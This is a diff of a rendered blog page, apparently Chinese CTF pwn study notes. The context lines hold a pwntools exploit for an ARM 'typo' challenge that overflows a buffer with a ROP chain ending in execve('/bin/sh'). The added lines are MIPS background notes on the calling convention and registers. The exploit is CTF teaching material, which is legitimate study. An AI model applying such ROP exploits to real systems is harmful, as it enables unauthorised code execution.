@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/PwnYouLin/blogimage@main/img/202403161803215.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/PwnYouLin/blogimage@main/img/202403161809594.png">
 <meta property="article:published_time" content="2024-03-15T14:12:42.000Z">
-<meta property="article:modified_time" content="2024-03-18T08:36:49.012Z">
+<meta property="article:modified_time" content="2024-03-18T08:44:40.500Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/PwnYouLin/blogimage@main/img/202403161756671.png">
@@ -213,7 +213,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          13k words
+          14k words
         
       </span>
     
@@ -224,7 +224,7 @@
         
         
         
-          111 mins
+          117 mins
         
       </span>
     
@@ -314,7 +314,84 @@
 <p>exp:</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-keyword">from</span> struct import pack<br><span class="hljs-comment">#banary = &quot;./pwn&quot;</span><br><span class="hljs-comment">#elf = ELF(banary)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>= <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>= 0<br>local = 1<br><span class="hljs-keyword">if</span> local:<br>    io = process([<span class="hljs-string">&quot;qemu-arm-static&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/arm-linux-gnueabi&quot;</span>,<span class="hljs-string">&quot;./typo&quot;</span>])<br><span class="hljs-keyword">else</span>:<br>    io = process([<span class="hljs-string">&quot;qemu-arm-static&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/arm-linux-gnueabi&quot;</span>,<span class="hljs-string">&quot;-g&quot;</span>,<span class="hljs-string">&quot;1234&quot;</span>,<span class="hljs-string">&quot;./typo&quot;</span>])<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;arm&#x27;</span>)<br><span class="hljs-comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><br>def dbg():<br>    gdb.attach(io)<br>    pause()<br><br>s = lambda data : io.send(data)<br>sl = lambda data : io.sendline(data)<br>sa = lambda text, data : io.sendafter(text, data)<br>sla = lambda text, data : io.sendlineafter(text, data)<br>r = lambda : io.recv()<br>ru = lambda text : io.recvuntil(text)<br>uu32 = lambda : u32(io.recvuntil(b<span class="hljs-string">&quot;\xff&quot;</span>)[-4:].ljust(4, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>uu64 = lambda : u64(io.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-6:].ljust(8, b<span class="hljs-string">&quot;\x00&quot;</span>))<br>iuu32 = lambda : int(io.recv(10),16)<br>iuu64 = lambda : int(io.recv(6),16)<br>uheap = lambda : u64(io.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>lg = lambda data : io.success(<span class="hljs-string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, eval(data)))<br>ia = lambda : io.interactive()<br><br>ru(<span class="hljs-string">&quot;Input ~ if you want to quit&quot;</span>)<br>s(b<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>sleep(0.5)<br>io.recv()<br><span class="hljs-comment">#payload=asm(shellcraft.sh()).ljust(112,b&#x27;A&#x27;)+p32(0xfffeef44)#shellcode</span><br><span class="hljs-attribute">pop_r0_r4_pc</span>=0x00020904<br><span class="hljs-attribute">bin_sh</span>=0x006C384<br><span class="hljs-attribute">svc_0</span>=0x00023b78<br><span class="hljs-attribute">pop_r7_pc</span>=0x00014068<br><span class="hljs-attribute">pop_r1_pc</span>=0x00068bec<br><span class="hljs-attribute">mov_r2_r4_blx_r3</span>=0x0003338c<br><span class="hljs-attribute">pop_r3_pc</span>=0x00008160<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*112+p32(pop_r7_pc)+p32(0xb)+p32(pop_r1_pc)+p32(0)+p32(pop_r0_r4_pc)+p32(bin_sh)+p32(0)+p32(pop_r3_pc)+p32(svc_0)+p32(mov_r2_r4_blx_r3)<br><span class="hljs-comment">#pause()</span><br>sl(payload)<br><br>ia()<br></code></pre></td></tr></table></figure>
 
-<h1 id="mips架构"><a href="#mips架构" class="headerlink" title="mips架构"></a>mips架构</h1><p>基础知识:<a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#mips">https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#mips</a></p>
+<h1 id="mips架构"><a href="#mips架构" class="headerlink" title="mips架构"></a>mips架构</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="MIPS-重要特性"><a href="#MIPS-重要特性" class="headerlink" title="MIPS 重要特性"></a>MIPS 重要特性</h3><ul>
+<li>mips本身不支持NX</li>
+</ul>
+<h3 id="MIPS-函数调用约定"><a href="#MIPS-函数调用约定" class="headerlink" title="MIPS 函数调用约定"></a>MIPS 函数调用约定</h3><ul>
+<li>调用者将参数保存在寄存器 $a0 - $a3 中。其总共能保存4个参数。如果有更多的参数，或者有传值的结构，其将被保存在栈中。</li>
+<li>调用者使用 jal 加上子程序的标记。返回地址保存在 $ra 中。</li>
+<li>返回地址是 PC + 4，PC 是 jal 指令的地址。</li>
+<li>如果被调用者使用框架指针，它通常将其设置为栈指针。旧的栈指针必须在之前被保存到栈中。</li>
+<li>被调用者通常在开头将其需要使用的寄存器保存到栈中。如果被调用者调用了辅助子程序，必须将 $ra入栈，同时也必须将临时寄存器或被保留的寄存器入栈。</li>
+<li>当子程序结束，返回值要保存在 $v0 - $v1 中。</li>
+<li>被调用者使用 jr $ra 返回到调用者那里。</li>
+</ul>
+<p>Ref:<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/79895392ecb2">https://www.jianshu.com/p/79895392ecb2</a></p>
+<h3 id="MIPS-寄存器"><a href="#MIPS-寄存器" class="headerlink" title="MIPS 寄存器"></a>MIPS 寄存器</h3><table>
+<thead>
+<tr>
+<th>寄存器编号</th>
+<th>别名</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>$zero</td>
+<td>常量0(constant value 0)</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>$at</td>
+<td>保留给汇编器(Reserved for assembler)</td>
+</tr>
+<tr>
+<td>$2-$3</td>
+<td>$v0-$v1</td>
+<td>函数调用返回值(values for results and expression evaluation)</td>
+</tr>
+<tr>
+<td>$4-$7</td>
+<td>$a0-$a3</td>
+<td>函数调用参数(arguments)</td>
+</tr>
+<tr>
+<td>$8-$15</td>
+<td>$t0-$t7</td>
+<td>暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td>$16-$23</td>
+<td>$s0-$s7</td>
+<td>保存的(或如果用，需要SAVE&#x2F;RESTORE的)(saved)</td>
+</tr>
+<tr>
+<td>$24-$25</td>
+<td>$t8-$t9</td>
+<td>暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td>$28</td>
+<td>$gp</td>
+<td>全局指针(Global Pointer)</td>
+</tr>
+<tr>
+<td>$29</td>
+<td>$sp</td>
+<td>堆栈指针(Stack Pointer)</td>
+</tr>
+<tr>
+<td>$30</td>
+<td>$fp&#x2F;$s8</td>
+<td>栈帧指针(Frame Pointer)</td>
+</tr>
+<tr>
+<td>$31</td>
+<td>$ra</td>
+<td>返回地址(return address)</td>
+</tr>
+</tbody></table>
+<p>基础知识:<a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#mips">https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#mips</a></p>
 <h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>ida的mipsrop插件:<a target="_blank" rel="noopener" href="https://github.com/tacnetsol/ida">https://github.com/tacnetsol/ida</a></p>
 <p>用ropper或者ROPgadget都不太好找gadget?</p>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="HWS夏令营结营赛题-pwn"><a href="#HWS夏令营结营赛题-pwn" class="headerlink" title="HWS夏令营结营赛题:pwn"></a>HWS夏令营结营赛题:<a target="_blank" rel="noopener" href="https://github.com/ReAbout/pwn-exercise-iot/blob/main/linux_mips_stack/mips_pwn_1/pwn">pwn</a></h3><p>运行：</p>
